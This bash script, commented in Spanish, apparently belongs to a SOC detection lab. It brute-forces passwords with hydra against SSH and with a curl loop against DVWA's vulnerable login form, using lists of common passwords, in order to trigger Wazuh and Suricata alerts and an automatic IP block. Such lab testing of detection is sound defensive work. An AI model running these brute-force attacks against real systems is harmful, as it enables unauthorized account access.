#!/usr/bin/env bash
# Ataque 2 - Fuerza bruta (MITRE T1110). Dos variantes; use las dos o la que prefiera.
#   app  -> login de DVWA  (reglas propias 100100/100101 + Suricata 1000003)
#   ssh  -> SSH del servidor (reglas Wazuh 5712/5763 -> RESPUESTA AUTOMÁTICA que bloquea su IP)
set -euo pipefail; source "$(dirname "$0")/lib.sh"
modo="${1:-app}"
LISTA=/usr/share/wordlists/metasploit/unix_passwords.txt
[ -f "$LISTA" ] || LISTA=/usr/share/wordlists/rockyou.txt.gz   # respaldo según la imagen
echo "[*] $(date '+%T') Fuerza bruta modo=$modo contra $OBJETIVO"

if [ "$modo" = ssh ]; then
  # 30 contraseñas contra el usuario soc; todas fallan (SSH solo con llave) -> Wazuh lo ve como ataque
  printf '%s\n' 123456 password admin root toor kali dvwa soc 12345 qwerty letmein \
    secret pass123 welcome changeme ubuntu test 1234 00000 abc123 \
    administrator p@ssw0rd passw0rd master login guest system user demo hunter > /tmp/claves.txt
  hydra -l soc -P /tmp/claves.txt -t 4 -f "$OBJETIVO" ssh || true
else
  dvwa_login
  # 20 intentos seguidos al formulario vulnerable -> supera el umbral de las reglas
  for p in 123456 password admin root toor kali dvwa 12345 qwerty letmein \
           secret welcome changeme test 1234 abc123 p@ssw0rd master login guest; do
    curl -s -b "$COOKIE" "$BASE/vulnerabilities/brute/?username=admin&password=$p&Login=Login" >/dev/null
    printf '.'
  done; echo
fi
echo "[*] $(date '+%T') Fin de la fuerza bruta"
